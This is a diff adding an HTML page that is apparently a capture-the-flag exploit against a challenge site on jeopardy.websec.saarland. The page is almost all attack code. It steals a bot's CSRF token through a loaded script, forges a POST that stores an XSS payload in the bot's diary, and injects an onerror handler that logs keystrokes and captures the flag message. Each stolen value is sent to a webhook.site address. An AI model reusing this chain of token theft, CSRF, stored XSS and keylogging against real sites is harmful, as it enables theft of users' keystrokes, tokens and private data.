@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Owley Verification</title>
+</head>
+<body>
+    <!-- 1. The Dummy Form: The XSSI script will inject the stolen token here -->
+    <form id="dummy_form"></form>
+
+    <!-- 2. The CSRF Form: Used to silently POST the payload to the bot's diary -->
+    <form id="csrf_form" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST" target="hidden_frame">
+        <input type="hidden" name="content" id="csrf_content">
+        <!-- We will populate this token field using JavaScript -->
+        <input type="hidden" name="csrfmiddlewaretoken" id="csrf_token_field">
+    </form>
+    
+    <!-- Hidden frame to prevent the form submission from navigating away immediately -->
+    <iframe name="hidden_frame" style="display:none;"></iframe>
+
+    <!-- 3. Load the vulnerable script to steal the token -->
+    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
+
+    <script>
+        // Wait for the CSRF script to load and execute
+        window.onload = function() {
+            // 4. Extract the bot's stolen token from our dummy form
+            var stolenToken = document.forms['dummy_form'].elements['csrfmiddlewaretoken'].value;
+
+            // 5. The XSS Payload (Wrapped in <script> tags for the diary)
+            var xssPayload = `<script>
+                document.domain = "owley-madison.jeopardy.websec.saarland";
+                var ifr = document.createElement('iframe');
+                ifr.src = "//match.owley-madison.jeopardy.websec.saarland/";
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+
+                ifr.onload = function() {
+                    var payload = "yassinmedhat</option><img src=x onerror=\\"" +
+                                  "document.domain='owley-madison.jeopardy.websec.saarland';" +
+                                  "parent.document.addEventListener('keyup', function(e) {" +
+                                  "  new Image().src='https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?key=' + encodeURIComponent(e.key);" +
+                                  "});" +
+                                  "var old_send = parent.send_message;" +
+                                  "parent.send_message = function() {" +
+                                  "  var full_flag = parent.document.getElementById('message').value;" +
+                                  "  new Image().src='https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?flag=' + encodeURIComponent(full_flag);" +
+                                  "  old_send();" + 
+                                  "};\\">";
+                    
+                    ifr.contentWindow.localStorage.setItem('favorites', JSON.stringify([payload]));
+
+                    // Redirect to Chat to trigger the final payload
+                    setTimeout(function() {
+                        window.top.location.href = "//chat.owley-madison.jeopardy.websec.saarland/";
+                    }, 1000); 
+                };
+            <\/script>`;
+
+            // 6. Arm the CSRF form with the payload and the stolen token
+            document.getElementById('csrf_content').value = xssPayload;
+            document.getElementById('csrf_token_field').value = stolenToken;
+
+            // 7. Fire the CSRF attack
+            document.getElementById('csrf_form').submit();
+
+            // 8. Wait 1 second for the diary to save, then force the bot to view its infected diary
+            setTimeout(function() {
+                window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
